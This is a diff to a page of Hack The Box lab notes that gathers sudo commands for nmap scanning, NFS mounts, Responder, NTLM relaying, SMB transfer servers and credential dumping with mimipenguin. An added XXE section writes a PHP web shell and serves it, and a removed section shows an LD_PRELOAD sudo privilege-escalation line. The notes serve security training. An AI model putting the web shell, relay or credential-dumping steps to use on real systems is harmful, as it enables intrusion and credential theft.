@@ -2110,10 +2228,41 @@ sudo umount -l /tmp/nfs    # lazy unmount — use if the mount hangs
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [NFS Enumeration and Exports — Example 2: 3. Clean up](/enumeration/nfs-enumeration-network-file-system#example-2-3-clean-up) · [NFS Enumeration and Exports — 3. Clean up](/enumeration/nfs-enumeration-network-file-system#3-clean-up)
+**Original note sections:** [NFS Enumeration and Exports — 3. Clean up](/enumeration/nfs-enumeration-network-file-system#3-clean-up)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
+
+</Accordion>
+
+<Accordion title="Commands">
+
+### Commands
+
+**Nmap**
+
+```bash
+nmap -sC -sV TARGET_IP
+nmap -p- TARGET_IP
+sudo nmap -sU --top-ports 20 TARGET_IP
+```
+
+**Responder**
+
+```bash
+sudo responder -I tun0 -A
+# Active lab capture (not analysis-only)
+sudo responder -I tun0
+```
+
+**mount**
+
+```bash
+mkdir -p /tmp/nfs
+sudo mount -t nfs TARGET_IP:/EXPORT /tmp/nfs -o nolock
+ls -la /tmp/nfs
+sudo umount /tmp/nfs
+```
 
 </Accordion>
 
@@ -2140,6 +2289,26 @@ sudo nmap -sU --top-ports 50 -Pn 10.10.10.10 -oA udp
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Nmap: Host Discovery, Scanning, and Output — A practical scan sequence](/recon/network-enumeration-with-nmap-cheat-sheet#a-practical-scan-sequence)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Check UDP independently">
+
+### Check UDP independently
+
+**Nmap: Host Discovery, Scanning, and Output**
+
+```bash
+sudo nmap -sU --top-ports 20 -sV TARGET_IP -oA evidence/nmap/udp-top
+sudo nmap -sU -sV -p 53,123,161 TARGET_IP -oA evidence/nmap/udp-selected
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Nmap: Host Discovery, Scanning, and Output — Check UDP independently](/recon/network-enumeration-with-nmap-cheat-sheet#check-udp-independently)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -2271,7 +2440,7 @@ python3 odat.py all -s <IP> -d XE -U <user> -P <pass>      # run every attack mo
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Oracle Database and TNS Enumeration — Example 3: Footprinting & SID enumeration](/enumeration/oracle-tns-rdbms-cheat-sheet#example-3-footprinting-&-sid-enumeration) · [Oracle Database and TNS Enumeration — Footprinting & SID enumeration](/enumeration/oracle-tns-rdbms-cheat-sheet#footprinting-&-sid-enumeration)
+**Original note sections:** [Oracle Database and TNS Enumeration — Footprinting & SID enumeration](/enumeration/oracle-tns-rdbms-cheat-sheet#footprinting-&-sid-enumeration)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -2309,51 +2478,6 @@ curl -s --max-time 8 -o /dev/null -w "HTTP %{http_code}\n" http://10.129.234.172
 
 ```bash
 sudo ip link set dev tun0 mtu 1200      # drop further to 1100 if needed
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pass the Certificate: PKINIT and Lab Walkthrough — Troubleshooting log (everything that bit me, and the fix)](/password-attacks/pass-the-certificate#troubleshooting-log-everything-that-bit-me-and-the-fix)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Pass the Certificate: PKINIT and Lab Walkthrough**
-
-Context from the notebook: certipy auth  / PKINIT reset, clock looks right Often still clock skew — your clock must match the  DC , not internet NTP (labs run their own time) sudo timedatectl set-ntp off ; read DC time  nmap -p445 --script smb2-time &lt;DC> ;  sudo date -u -s "..." . Verify  date -u  ≈ DC within 5 min
-
-```text
-sudo timedatectl set-ntp off
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pass the Certificate: PKINIT and Lab Walkthrough — Troubleshooting log (everything that bit me, and the fix)](/password-attacks/pass-the-certificate#troubleshooting-log-everything-that-bit-me-and-the-fix)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Pass the Certificate: PKINIT and Lab Walkthrough**
-
-Context from the notebook: certipy auth  / PKINIT reset, clock looks right Often still clock skew — your clock must match the  DC , not internet NTP (labs run their own time) sudo timedatectl set-ntp off ; read DC time  nmap -p445 --script smb2-time &lt;DC> ;  sudo date -u -s "..." . Verify  date -u  ≈ DC within 5 min
-
-```text
-sudo date -u -s "..."
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pass the Certificate: PKINIT and Lab Walkthrough — Troubleshooting log (everything that bit me, and the fix)](/password-attacks/pass-the-certificate#troubleshooting-log-everything-that-bit-me-and-the-fix)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Pass the Certificate: PKINIT and Lab Walkthrough**
-
-Context from the notebook: Back it up first ( sudo cp /etc/ssl/openssl.cnf&#123;,.bak&#125; ). If it already has an  [openssl_init] , add  ssl_conf = ssl_sect   into  it rather than duplicating.
-
-```text
-sudo cp /etc/ssl/openssl.cnf{,.bak}
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
@@ -2655,6 +2779,66 @@ sudo nmap -sV -p 110,143,993,995 --script "pop3-capabilities,imap-capabilities" 
 
 </Accordion>
 
+<Accordion title="1. Establish your route and record the scan">
+
+### 1. Establish your route and record the scan
+
+**Recon & Services: Enumeration Methodology**
+
+```bash
+sudo nmap -sU --top-ports 20 -sV -oA evidence/nmap/udp-top "$TARGET_IP"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Recon & Services: Enumeration Methodology — 1. Establish your route and record the scan](/enumeration/methodology#1-establish-your-route-and-record-the-scan)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Discover ports, then identify services">
+
+### Discover ports, then identify services
+
+**Recon & Services: Enumeration Methodology**
+
+```bash
+# A separate UDP pass when required; this needs suitable privileges.
+sudo nmap -sU --top-ports 20 -sV -oA evidence/nmap/udp-top "$TARGET_IP"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Recon & Services: Enumeration Methodology — Discover ports, then identify services](/enumeration/methodology#discover-ports-then-identify-services)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="FTP and NFS">
+
+### FTP and NFS
+
+**Recon & Services: Enumeration Methodology**
+
+```bash
+sudo mkdir -p /mnt/lab-nfs
+sudo mount -t nfs -o ro "$TARGET_IP:/EXPORTED_PATH" /mnt/lab-nfs
+ls -la /mnt/lab-nfs
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Recon & Services: Enumeration Methodology — FTP and NFS](/enumeration/methodology#ftp-and-nfs)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Responder — Interface and Startup">
 
 ### Responder — Interface and Startup
@@ -2667,7 +2851,7 @@ sudo responder -I LAB_INTERFACE -A
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Responder — Interface and Startup — Example 3: Responder — Interface and Startup](/tools/responder#example-3-responder-—-interface-and-startup) · [Responder — Interface and Startup — Existing notes and worked examples](/tools/responder#existing-notes-and-worked-examples)
+**Original note sections:** [Responder — Interface and Startup — Responder — Interface and Startup](/tools/responder)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -2687,7 +2871,7 @@ telnet <IP> 25      # then: HELO x / VRFY root / EXPN admin / RCPT TO:<ext@dom>
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Read and Search Email with POP3 and IMAP — Example 1: SMTP Status Code Lookup](/enumeration/email-enumeration-manipulation-pop3-imap#example-1-smtp-status-code-lookup) · [SMTP Status Code Lookup — Example 1: SMTP Status Code Lookup](/enumeration/smtp-status-code-cheat-sheet#example-1-smtp-status-code-lookup) · [SMTP Status Code Lookup — Existing notes and worked examples](/enumeration/smtp-status-code-cheat-sheet#existing-notes-and-worked-examples)
+**Original note sections:** [SMTP Status Code Lookup — SMTP Status Code Lookup](/enumeration/smtp-status-code-cheat-sheet)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -2707,6 +2891,25 @@ sudo nmap -sU -p 161 --script snmp-info <Target-IP>   # detect agent + pull basi
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [SNMP Enumeration, OIDs, and Community Strings — How devices organise their data: OIDs and the MIB](/enumeration/snmp-enumeration-simple-network-management-protocol#how-devices-organise-their-data-oids-and-the-mib)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="SQLMap Installation">
+
+### SQLMap Installation
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sudo apt install sqlmap
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — SQLMap Installation](/web/htb/sqlmap-essentials#sqlmap-installation)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -2833,6 +3036,34 @@ sudo nc -lvnp 443
 
 </Accordion>
 
+<Accordion title="Linux identity, environment, and network">
+
+### Linux identity, environment, and network
+
+**Systems & Pivoting: Enumeration Methodology**
+
+```bash
+id
+hostname
+pwd
+uname -a
+cat /etc/os-release
+sudo -l
+ip address
+ip route
+ss -lntup
+ps aux
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Systems & Pivoting: Enumeration Methodology — Linux identity, environment, and network](/pivoting/methodology#linux-identity-environment-and-network)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Change Admin Password">
 
 ### Change Admin Password
@@ -2933,6 +3164,91 @@ https://localhost:8834
 
 </Accordion>
 
+<Accordion title="Remote Code Execution with XXE">
+
+### Remote Code Execution with XXE
+
+**Web Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+grcic550@htb[/htb]$ sudo python3 -m http.server 80
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Remote Code Execution with XXE](/web/htb/web-attacks#remote-code-execution-with-xxe)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="1. Kali — receive folder and SMB server">
+
+### 1. Kali — receive folder and SMB server
+
+**Windows → Kali file transfer**
+
+```bash
+mkdir -p ~/transfer
+sudo impacket-smbserver share ~/transfer -smb2support -user transfer -password 'TRANSFER_PASSWORD'
+```
+
+</Accordion>
+
+<Accordion title="Change ownership of one controlled lab file">
+
+### Change ownership of one controlled lab file
+
+**chown**
+
+```bash
+sudo chown LAB_USER:LAB_GROUP ./lab-file
+ls -ln ./lab-file
+```
+
+</Accordion>
+
+<Accordion title="Inspect supported Linux process memory in a controlled lab">
+
+### Inspect supported Linux process memory in a controlled lab
+
+**mimipenguin**
+
+```bash
+sudo ./mimipenguin.sh
+```
+
+</Accordion>
+
+<Accordion title="Inspect a permitted export read-only">
+
+### Inspect a permitted export read-only
+
+**mount**
+
+```bash
+mkdir -p /tmp/nfs-review
+sudo mount -t nfs -o ro TARGET_IP:/EXPORT /tmp/nfs-review
+ls -lan /tmp/nfs-review
+sudo umount /tmp/nfs-review
+```
+
+</Accordion>
+
+<Accordion title="Set up a relay to one explicit SMB destination">
+
+### Set up a relay to one explicit SMB destination
+
+**ntlmrelayx.py**
+
+```bash
+sudo impacket-ntlmrelayx -t smb://TARGET_IP -smb2support
+```
+
+</Accordion>
+
 <Accordion title="Find or install the command">
 
 ### Find or install the command
@@ -2957,303 +3273,16 @@ sudo apt install impacket-scripts
 
 </Accordion>
 
-<Accordion title="🚨 GLOBAL CAVEATS (the stuff that wasted hours)">
+<Accordion title="Serve a dedicated authenticated transfer directory">
 
-### 🚨 GLOBAL CAVEATS (the stuff that wasted hours)
+### Serve a dedicated authenticated transfer directory
 
-**Active Directory Attack Path: Worked Lab**
+**smbserver.py**
 
-Context from the notebook: SSH/PKINIT/LDAPS  connects then hangs , or "Connection reset by peer", while ping/ nc -z  work VPN MTU  — large packets fragment & drop; small ones pass sudo ip link set dev tun0 mtu 1200
-
-```text
-sudo ip link set dev tun0 mtu 1200
+```bash
+mkdir -p ./transfer
+sudo impacket-smbserver share ./transfer -smb2support -user transfer -password 'TRANSFER_PASSWORD'
 ```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — 🚨 GLOBAL CAVEATS (the stuff that wasted hours)](/cheatsheets/ad-attack-path-worked-example#-global-caveats-the-stuff-that-wasted-hours) · [Pivoting, Tunneling, and Port Forwarding: Module Notes — 5 · Field-tested gotchas](/modules/pivoting-tunneling-port-forwarding#5-·-field-tested-gotchas) · [Pass the Certificate: PKINIT and Lab Walkthrough — Troubleshooting log (everything that bit me, and the fix)](/password-attacks/pass-the-certificate#troubleshooting-log-everything-that-bit-me-and-the-fix) · [Pass the Certificate: PKINIT and Lab Walkthrough — Key Takeaways](/password-attacks/pass-the-certificate#key-takeaways)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Troubleshooting">
-
-### Troubleshooting
-
-**BloodHound — Start, Collect, and Import**
-
-Context from the notebook: First-time setup requested Run  sudo bloodhound-setup  once and follow its database-configuration instructions.
-
-```text
-sudo bloodhound-setup
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [BloodHound — Start, Collect, and Import — Troubleshooting](/tools/bloodhound#troubleshooting)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**BloodHound — Start, Collect, and Import**
-
-Context from the notebook: Service does not start Check  sudo systemctl status bloodhound postgresql --no-pager  and  sudo neo4j status .
-
-```text
-sudo systemctl status bloodhound postgresql --no-pager
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [BloodHound — Start, Collect, and Import — Troubleshooting](/tools/bloodhound#troubleshooting)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**BloodHound — Start, Collect, and Import**
-
-Context from the notebook: Service does not start Check  sudo systemctl status bloodhound postgresql --no-pager  and  sudo neo4j status .
-
-```text
-sudo neo4j status
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [BloodHound — Start, Collect, and Import — Troubleshooting](/tools/bloodhound#troubleshooting)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**BloodHound — Start, Collect, and Import**
-
-Context from the notebook: Need the application error Run  sudo journalctl -u bloodhound -n 80 --no-pager .
-
-```text
-sudo journalctl -u bloodhound -n 80 --no-pager
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [BloodHound — Start, Collect, and Import — Troubleshooting](/tools/bloodhound#troubleshooting)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Key Principles">
-
-### Key Principles
-
-**Footprinting: Service-by-Service Lab Workflow**
-
-Context from the notebook: 8. Unmount NFS When Done.  Stale NFS mounts freeze your terminal. Always  sudo umount -l  when the target changes.
-
-```text
-sudo umount -l
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — Key Principles](/enumeration/footprinting-lab-methodology-cheat-sheet#key-principles)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="History (stop re-typing)">
-
-### History (stop re-typing)
-
-**Kali Terminal, tmux, zsh, and Vim**
-
-Context from the notebook: !! the entire last command (e.g.  sudo !! )
-
-```text
-sudo !!
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Kali Terminal, tmux, zsh, and Vim — History (stop re-typing)](/cheatsheets/terminal-tmux-zsh-cheatsheet#history-stop-re-typing) · [Kali Terminal, tmux, zsh, and Vim — 7. Useful Kali workflow tips](/cheatsheets/terminal-tmux-zsh-cheatsheet#7-useful-kali-workflow-tips)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="LD_PRELOAD and NOPASSWD">
-
-### LD_PRELOAD and NOPASSWD
-
-**Linux Privilege Escalation: Full Checklist**
-
-Context from the notebook: Execute any binary with the LD_PRELOAD to spawn a shell :  sudo LD_PRELOAD=&lt;full_path_to_so_file> &lt;program> , e.g:  sudo LD_PRELOAD=/tmp/shell.so find
-
-```text
-sudo LD_PRELOAD=<full_path_to_so_file> <program>
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — LD_PRELOAD and NOPASSWD](/privesc/linux-privesc-checklist#ld_preload-and-nopasswd)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Linux Privilege Escalation: Full Checklist**
-
-Context from the notebook: Execute any binary with the LD_PRELOAD to spawn a shell :  sudo LD_PRELOAD=&lt;full_path_to_so_file> &lt;program> , e.g:  sudo LD_PRELOAD=/tmp/shell.so find
-
-```text
-sudo LD_PRELOAD=/tmp/shell.so find
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — LD_PRELOAD and NOPASSWD](/privesc/linux-privesc-checklist#ld_preload-and-nopasswd)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Quick reference">
-
-### Quick reference
-
-**NFS Enumeration and Exports**
-
-Context from the notebook: First move showmount -e &lt;IP>  →  sudo mount -t nfs &lt;IP>:/&lt;export> /tmp/nfs
-
-```text
-sudo mount -t nfs <IP>:/<export> /tmp/nfs
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [NFS Enumeration and Exports — Quick reference](/enumeration/nfs-enumeration-network-file-system#quick-reference)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="5 · Vulnerability Assessment">
-
-### 5 · Vulnerability Assessment
-
-**Original Box Checklist — Historical Plan**
-
-Context from the notebook: Shocker  🟩 Easy 🔺PE — Shellshock →  sudo perl
-
-```text
-sudo perl
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Original Box Checklist — Historical Plan — 5 · Vulnerability Assessment](/practice/original-box-checklist#5-·-vulnerability-assessment)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Troubleshooting quick reference">
-
-### Troubleshooting quick reference
-
-**Pass the Ticket from Linux**
-
-Context from the notebook: Kerberos ticket expired  even on a fresh ticket / KDC reached OK Clock skew  — your attack host's time differs from the domain's (HTB labs run on a fixed date, e.g. 2022). Kerberos compares timestamps, so the ticket looks expired Set your clock into the ticket's  Valid starting – Expires  window:  sudo timedatectl set-ntp off; sudo date -s "2022-10-07 12:00:00"  — or sync to the DC:  sudo ntpdate -u &lt;DC_IP> . Restore later with  sudo timedatectl set-ntp on
-
-```text
-sudo timedatectl set-ntp off; sudo date -s "2022-10-07 12:00:00"
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pass the Ticket from Linux — Troubleshooting quick reference](/password-attacks/pass-the-ticket-from-linux#troubleshooting-quick-reference)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Pass the Ticket from Linux**
-
-Context from the notebook: Kerberos ticket expired  even on a fresh ticket / KDC reached OK Clock skew  — your attack host's time differs from the domain's (HTB labs run on a fixed date, e.g. 2022). Kerberos compares timestamps, so the ticket looks expired Set your clock into the ticket's  Valid starting – Expires  window:  sudo timedatectl set-ntp off; sudo date -s "2022-10-07 12:00:00"  — or sync to the DC:  sudo ntpdate -u &lt;DC_IP> . Restore later with  sudo timedatectl set-ntp on
-
-```text
-sudo ntpdate -u <DC_IP>
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pass the Ticket from Linux — Troubleshooting quick reference](/password-attacks/pass-the-ticket-from-linux#troubleshooting-quick-reference)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Pass the Ticket from Linux**
-
-Context from the notebook: Kerberos ticket expired  even on a fresh ticket / KDC reached OK Clock skew  — your attack host's time differs from the domain's (HTB labs run on a fixed date, e.g. 2022). Kerberos compares timestamps, so the ticket looks expired Set your clock into the ticket's  Valid starting – Expires  window:  sudo timedatectl set-ntp off; sudo date -s "2022-10-07 12:00:00"  — or sync to the DC:  sudo ntpdate -u &lt;DC_IP> . Restore later with  sudo timedatectl set-ntp on
-
-```text
-sudo timedatectl set-ntp on
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pass the Ticket from Linux — Troubleshooting quick reference](/password-attacks/pass-the-ticket-from-linux#troubleshooting-quick-reference)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Which machine runs what (read this first)">
-
-### Which machine runs what (read this first)
-
-**Pass the Ticket from Linux**
-
-Context from the notebook: The Kerberos client tools come from the  krb5-user  package:  sudo apt install -y krb5-user . Install prompts —  default realm:   INLANEFREIGHT.HTB  (uppercase);  Kerberos server / KDC:   dc01.inlanefreight.htb ; admin server can be the same or blank. You can fix any of these later in  /etc/krb5.conf . You don't strictly need  klist  to  use  a ticket (tools read  KRB5CCNAME  directly), but it's how you  verify  a ticket loaded and hasn't expired.
-
-```text
-sudo apt install -y krb5-user
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pass the Ticket from Linux — Which machine runs what (read this first)](/password-attacks/pass-the-ticket-from-linux#which-machine-runs-what-read-this-first) · [Pass the Ticket from Linux — Troubleshooting quick reference](/password-attacks/pass-the-ticket-from-linux#troubleshooting-quick-reference)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="WinRM (5985/HTTP, 5986/HTTPS)">
-
-### WinRM (5985/HTTP, 5986/HTTPS)
-
-**Password Attacks: Cracking, Files, and Credential Stores**
-
-Context from the notebook: Installs via  sudo gem install evil-winrm . Gives a PowerShell Remoting session.
-
-```text
-sudo gem install evil-winrm
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — WinRM (5985/HTTP, 5986/HTTPS)](/password-attacks/password-attacks-cheat-sheet#winrm-5985/http-5986/https)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
 
 </Accordion>
 
@@ -3595,6 +3624,10 @@ rusers -al <IP>                # detailed logged-in user info
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://www.sudo.ws/docs/man/sudo.man/)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -3602,5 +3635,3 @@ rusers -al <IP>                # detailed logged-in user info
 - [Linux Privilege Escalation: Full Checklist](/privesc/linux-privesc-checklist)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
